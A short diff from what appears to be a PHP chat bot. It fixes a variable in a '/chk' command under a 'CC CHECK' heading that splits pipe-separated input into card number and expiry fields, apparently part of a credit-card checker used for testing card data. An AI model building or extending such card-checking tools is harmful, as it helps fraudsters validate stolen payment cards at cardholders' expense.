@@ -99,7 +99,7 @@ Click on the buttons below to get documentation about specific modules!",
 ////////////////=========[CC CHECK]=========////////////////
 
 if (strpos($text, "/chk") === 0){
-$lista = substr($message, 5);
+$lista = substr($text, 5);
 $i     = explode("|", $lista);
 $cc    = $i[0];
 $mon   = $i[1];
